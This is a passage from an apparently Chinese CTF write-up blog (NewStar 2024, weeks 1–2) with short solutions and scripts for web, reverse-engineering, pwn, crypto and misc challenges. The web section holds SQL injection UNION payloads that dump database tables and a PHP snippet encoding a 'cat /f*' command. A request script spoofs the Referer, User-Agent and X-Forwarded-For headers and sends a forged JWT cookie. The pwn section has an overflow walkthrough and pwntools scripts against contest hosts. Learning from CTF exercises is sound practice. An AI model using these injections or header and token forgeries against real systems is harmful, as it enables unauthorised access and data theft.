class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error));<br><br></code></pre></td></tr></table></figure><p>flag{WA0w!_y4_r3al1y_Gr4sP}？不对，应该直接ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9然后再转base64的</p><h3 id="智械危机"><a class="markdownIt-Anchor" href="#智械危机"></a> 智械危机</h3><p>找到对应的然后跑脚本填入得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$decrypted_cmd</span>=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$decrypted_cmd</span>);<br><span class="hljs-variable">$reversed_cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>    <span class="hljs-variable">$reversed_cmd</span> .= <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>&#125;<br><span class="hljs-variable">$hashed_reversed_cmd</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$reversed_cmd</span>);<br><span class="hljs-variable">$decode_key</span>=<span class="hljs-variable">$hashed_reversed_cmd</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$decode_key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<br></code></pre></td></tr></table></figure><p>将得到的对应内容进行post发包即可</p><h3 id="pangbai-过家家1"><a class="markdownIt-Anchor" href="#pangbai-过家家1"></a> PangBai 过家家（1）</h3><p>体感不算好，但是题目很好，不知道为什么这么卡的原因</p><p>第一层没怎么看明白，简单的抓包后修改一下header里的cookie看网络回显location进入第二层</p><p>第二层换cookie，get发包?ask=miao</p><p>第三层post发包say=hello</p><p>第四层改个referer，再把agent改一下把firefox改成Papa就行了</p><p>这层好像也要改为say=玛卡巴卡阿卡哇卡米卡玛卡呣</p><p>第五层好像是发patch，我是python进行发包的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 目标 URL</span><br>url = <span class="hljs-string">&quot;http://101.200.139.65:25030/?ask=Papa&quot;</span><br><br><span class="hljs-comment"># 构造文件上传部分和字符串参数</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;patch.zip&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>))&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;say&#x27;</span>: <span class="hljs-string">&#x27;玛卡巴卡阿卡哇卡米卡玛卡呣&#x27;</span><br>&#125;<br><br><span class="hljs-comment"># 添加必要的 headers</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.J62yrWvSS_4OY6g19WR70lIq5DBRs70ISiH1rf8OUB0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://101.200.139.65:35208/?ask=Papa&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Papa/5.0 (Windows NT 10.0; Win64; x64)&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://101.200.139.65:35208&#x27;</span>,<br>    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>:<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>&#125;<br><br><span class="hljs-comment"># 发送 PATCH 请求</span><br>response = requests.patch(url, files=files, data=data, headers=headers)<br><br><span class="hljs-comment"># 打印服务器返回的响应</span><br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p>第六层好像是jwt的更改，题目给了密钥直接在网站上改为level0再带入进行了</p><p><img src="/../../images/Newstar/2024/13.png" alt="13"></p><p>最后带入进行修改我把包又带到bp的自带浏览器里面得到最后的flag,按一下醒来等flag就行了</p><p><img src="/../../images/Newstar/2024/14.png" alt="14"></p><h3 id="谢谢皮蛋"><a class="markdownIt-Anchor" href="#谢谢皮蛋"></a> 谢谢皮蛋</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()#<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()#<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Fl4g&#x27;</span>#<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,des,<span class="hljs-keyword">value</span>) <span class="hljs-keyword">from</span> Fl4g#<br></code></pre></td></tr></table></figure><h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2><h3 id="begin"><a class="markdownIt-Anchor" href="#begin"></a> begin</h3><p>跟着流程做，一共三个部分，f5然后a,shiftf12,x</p><p>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p><h3 id="base64"><a class="markdownIt-Anchor" href="#base64"></a> base64</h3><p>简单的base64换表</p><p><img src="/../../images/Newstar/2024/7.png" alt="7"></p><h3 id="ezandroidstudy"><a class="markdownIt-Anchor" href="#ezandroidstudy"></a> ezAndroidStudy</h3><p>使用工具是jeb</p><p>flag1和flag2直接全局搜索得到flag部分，flag2在注释里，忘截屏了</p><p><img src="/../../images/Newstar/2024/8.png" alt="8"></p><p>flag3在xml中</p><p><img src="/../../images/Newstar/2024/9.png" alt="9"></p><p>flag4也是搜索然后在注释里得到</p><p><img src="/../../images/Newstar/2024/10.png" alt="10"></p><p>flag5在so里面导出然后带入ida逆向一下</p><p><img src="/../../images/Newstar/2024/11.png" alt="11"></p><h3 id="simple_encryption"><a class="markdownIt-Anchor" href="#simple_encryption"></a> Simple_encryption</h3><p>ida然后f5看main函数，一个简单的异或，定位一下密钥，简单的脚本带入</p><p><img src="/../../images/Newstar/2024/12.png" alt="12"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idaapi <span class="hljs-keyword">import</span> *<br>decoded = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>    enc = get_byte(<span class="hljs-number">0x403020</span> + i)<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        enc = (enc + <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0xFF</span> <br>    <span class="hljs-keyword">elif</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">1</span>:<br>        enc = (enc - <span class="hljs-number">41</span>) &amp; <span class="hljs-number">0xFF</span> <br>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># i % 3 == 2</span><br>        enc ^= <span class="hljs-number">0x55</span><br>    decoded += <span class="hljs-built_in">chr</span>(enc)<br><span class="hljs-built_in">print</span>(decoded)<br></code></pre></td></tr></table></figure><h3 id="ez_debug"><a class="markdownIt-Anchor" href="#ez_debug"></a> ez_debug</h3><p>ida打开简单的看一下判断flag后会对密文进行解密</p><p><img src="/../../images/Newstar/2024/21.png" alt="15">可以用x64dbg打断点得到flag</p><p><img src="/../../images/Newstar/2024/20.png" alt="15"></p><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> pwn</h2><h3 id="real-login"><a class="markdownIt-Anchor" href="#real-login"></a> Real Login</h3><p>有附件进行下载，ida的f5得到密钥，直接cat flag就行</p><p><img src="/../../images/Newstar/2024/15.png" alt="15"></p><h3 id="game"><a class="markdownIt-Anchor" href="#game"></a> Game</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;39.106.48.123&#x27;</span>, <span class="hljs-number">30474</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;Let&#x27;s play a game!&quot;</span>)<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    p.sendline(<span class="hljs-string">&#x27;10&#x27;</span>) <br>    p.recvuntil(<span class="hljs-string">&quot;pls input you num: &quot;</span>)  <br>p.interactive() <br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/16.png" alt="16"></p><p>大概的思路就是在5u内填入数字最后大于999即可，然后就可以进入执行命令了</p><h3 id="overwrite"><a class="markdownIt-Anchor" href="#overwrite"></a> overwrite</h3><p><img src="/../../images/Newstar/2024/17.png" alt="16"></p><p>有长度限制通过输入-1进行绕过，在read函数中会转换为unsigned int类型允许读取大量数据</p><p><code>nbytes_4</code> 在栈中有固定大小（0x30），填充 0x30 字节后，可以覆盖返回地址。</p><p><code>atoi</code> 的输入字符串在可处理的范围内（即不超过 <code>2147483647</code>），否则可能导致未定义行为，返回0</p><p>所以输入(0x30+0x06)个数字即可</p><p><img src="/../../images/Newstar/2024/18.png" alt="18"></p><h3 id="gdb"><a class="markdownIt-Anchor" href="#gdb"></a> gdb</h3><p>ida简单的看一下</p><p><img src="/../../images/Newstar/2024/19.png" alt></p><p>用pwndbg进行查看，enc在<code>rbp-0x439</code>，<code>4557455355431d45</code>同时注意有不可见字符\x1d</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;101.200.139.65&quot;</span>,<span class="hljs-number">25014</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;data:&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&quot;\x5d\x1d\x43\x55\x53\x45\x57\x45&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/22.png" alt="18"></p><p>week2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br>session = requests.Session()<br>url = <span class="hljs-string">&#x27;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/start&#x27;</span><br>res = session.get(url)<br><br>soup = BeautifulSoup(res.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br>text = soup.find(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;text&#x27;</span>).get_text()<br>user_input = text<br><br>post_url = <span class="hljs-string">&#x27;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/submit&#x27;</span>  <span class="hljs-comment"># 替换为实际的 POST URL</span><br>data = &#123;<span class="hljs-string">&#x27;user_input&#x27;</span>: user_input&#125;  <span class="hljs-comment"># 设置 POST 数据</span><br><br><span class="hljs-comment"># 发送 POST 请求</span><br>response = session.post(post_url, data=data)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><h1 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h1><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2"></a> Crypto</h2><h3 id="这是几次方-疑惑"><a class="markdownIt-Anchor" href="#这是几次方-疑惑"></a> 这是几次方？ 疑惑！</h3><p>加法的运算逻辑在^之前</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 已知参数</span><br>n = <span class="hljs-number">124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762</span><br>hint = <span class="hljs-number">12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span><br><br><span class="hljs-comment"># 步骤 1: 恢复 p</span><br>p = hint ^ (e + <span class="hljs-number">10086</span>)<br><br><span class="hljs-comment"># 步骤 2: 计算 q</span><br>q = n // p<br><br><span class="hljs-comment"># 步骤 3: 计算 d (私钥)</span><br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br><br><span class="hljs-comment"># 步骤 4: 解密密文</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = long_to_bytes(m)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><h3 id="just-one-and-more-than-two"><a class="markdownIt-Anchor" href="#just-one-and-more-than-two"></a> Just one and more than two</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 已知参数</span><br>p = <span class="hljs-number">11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span><br>q = <span class="hljs-number">11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span><br>r = <span class="hljs-number">12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span><br>c1 = <span class="hljs-number">8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span><br>c2 = <span class="hljs-number">1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span><br>e = <span class="hljs-number">65537</span><br><br><span class="hljs-comment"># 步骤 1: 从 c1 解密</span><br>d1 = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, p - <span class="hljs-number">1</span>)<br>m1 = <span class="hljs-built_in">pow</span>(c1, d1, p)<br><br><span class="hljs-comment"># 步骤 2: 计算 N 和 phi(N)</span><br>N = p * q * r<br>phi_N = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>) * (r - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 步骤 3: 从 c2 解密</span><br>d2 = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi_N)<br>m2 = <span class="hljs-built_in">pow</span>(c2, d2, N)<br><br><span class="hljs-comment"># 拼接明文</span><br>flag = long_to_bytes(m1) + long_to_bytes(m2)<br><br><span class="hljs-built_in">print</span>(flag.decode())<br></code></pre></td></tr></table></figure><h3 id="since-you-konw-something"><a class="markdownIt-Anchor" href="#since-you-konw-something"></a> Since you konw something</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_bytes</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(x ^ y <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b * (<span class="hljs-built_in">len</span>(a) // <span class="hljs-built_in">len</span>(b) + <span class="hljs-number">1</span>)))<br><br>c = <span class="hljs-number">218950457292639210021937048771508243745941011391746420225459726647571</span><br><br><span class="hljs-comment"># Convert c back to bytes</span><br>c_bytes = long_to_bytes(c)<br><br><span class="hljs-comment"># Function to try decryption with a given key</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_decrypt</span>(<span class="hljs-params">key</span>):<br>    decrypted = xor_bytes(c_bytes, key)<br>    <span class="hljs-keyword">if</span> decrypted.startswith(<span class="hljs-string">b&#x27;flag&#123;&#x27;</span>) <span class="hljs-keyword">and</span> decrypted.endswith(<span class="hljs-string">b&#x27;&#125;&#x27;</span>):<br>        <span class="hljs-keyword">return</span> decrypted.decode()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># Try all possible single-byte keys</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    key = <span class="hljs-built_in">bytes</span>([i])<br>    result = try_decrypt(key)<br>    <span class="hljs-keyword">if</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found flag with key <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># If single-byte key doesn&#x27;t work, try short strings</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>    <span class="hljs-keyword">import</span> string<br>    <span class="hljs-keyword">import</span> itertools<br>    chars = string.printable.encode()<br>    <span class="hljs-keyword">for</span> length <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>):  <span class="hljs-comment"># Try keys up to 4 characters long</span><br>        <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> itertools.product(chars, repeat=length):<br>            key = <span class="hljs-built_in">bytes</span>(key)<br>            result = try_decrypt(key)<br>            <span class="hljs-keyword">if</span> result:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found flag with key <span class="hljs-subst">&#123;key.<span class="hljs-built_in">hex</span>()&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> result:<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Could not find the key. The key might be longer or more complex.&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="茶里茶气"><a class="markdownIt-Anchor" href="#茶里茶气"></a> 茶里茶气</h3><p>难得自己分析之后再叫ai写的</p><p>开头是一个类tea的算法，然后之后拼接转回hex再拼接一下就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">446302455051275584229157195942211</span><br>v0 = <span class="hljs-number">190997821330413928409069858571234</span><br>v1 = <span class="hljs-number">137340509740671759939138452113480</span><br><br>derta = <span class="hljs-number">462861781278454071588539315363</span><br>v3 = <span class="hljs-number">489552116384728571199414424951</span><br>v4 = <span class="hljs-number">469728069391226765421086670817</span><br>v5 = <span class="hljs-number">564098252372959621721124077407</span><br>v6 = <span class="hljs-number">335640247620454039831329381071</span><br><br>v2 = (derta * <span class="hljs-number">32</span>) % p<br><span class="hljs-comment"># 反向32次迭代的加密过程</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    v2 = (v2 - derta) % p<br>    v0 = (v0 - ((v1 + v2) ^ (<span class="hljs-number">8</span> * v1 + v5) ^ ((v1 &gt;&gt; <span class="hljs-number">7</span>) + v6))) % p<br>    v1 = (v1 - ((v0 + v2) ^ (<span class="hljs-number">8</span> * v0 + v3) ^ ((v0 &gt;&gt; <span class="hljs-number">7</span>) + v4))) % p<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v0=&quot;</span>, v0)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;v1=&quot;</span>, v1)<br>l = <span class="hljs-number">199</span><br>shift = l // <span class="hljs-number">2</span><br><br>combined = (v0 &lt;&lt; shift) + v1<br>a = <span class="hljs-built_in">hex</span>(combined)[<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>:<br>    a = <span class="hljs-string">&quot;0&quot;</span> + a<br><br>flag = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(a[i:i+<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(a), <span class="hljs-number">2</span>)])<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Recovered flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2"></a> Misc</h2><h3 id="wireshark_checkin"><a class="markdownIt-Anchor" href="#wireshark_checkin"></a> wireshark_checkin</h3><p>wireshark打开http看一下追踪里面里面有flag</p><p><img src="/../../images/Newstar/2024/23.png" alt="23"></p><h3 id="wireshark_secret"><a class="markdownIt-Anchor" href="#wireshark_secret"></a> wireshark_secret</h3><p>导出图片得到flag</p><p><img src="/../../images/Newstar/2024/24.png" alt="24"></p><h3 id="热心助人的小明同学"><a class="markdownIt-Anchor" href="#热心助人的小明同学"></a> 热心助人的小明同学</h3><p>Passware Kit Forensic工具一把梭</p><p><img src="/../../images/Newstar/2024/25.png" alt="25"></p><h3 id="用溯流仪见证伏特台风"><a class="markdownIt-Anchor" href="#用溯流仪见证伏特台风"></a> 用溯流仪见证伏特台风</h3><p><a href="https://news.sina.com.cn/zx/gj/2024-07-08/doc-inccmcxn1550323.shtml#:~:text=4%E6%9C%8815%E6%97%A5%EF%BC%8C%E4%B8%AD%E5%9B%BD?qq-pf-to=pcqq.group">查找到网站</a>，定位到domain，进行16位小写md5得到flag</p><h3 id="你也玩原神吗"><a class="markdownIt-Anchor" href="#你也玩原神吗"></a> 你也玩原神吗</h3><p>gif提取内容</p><p><img src="/../../images/Newstar/2024/36.jpeg" alt="36"></p><p>原神真好玩😋，我直接手调</p><p><img src="/../../images/Newstar/2024/26.jpg" alt="26"></p><p>右下角的内容就行栅栏解密</p><p><img src="/../../images/Newstar/2024/27.png" alt="27"></p><h3 id="字里行间的秘密"><a class="markdownIt-Anchor" href="#字里行间的秘密"></a> 字里行间的秘密</h3><p>txt打开看下面的字符，零宽度隐写</p><p><img src="/../../images/Newstar/2024/28.png" alt="28"></p><p>带入解密，复制粘贴到txt里面即可得到flag</p><h3 id="hertas-study"><a class="markdownIt-Anchor" href="#hertas-study"></a> Herta’s Study</h3><p>加密逻辑</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 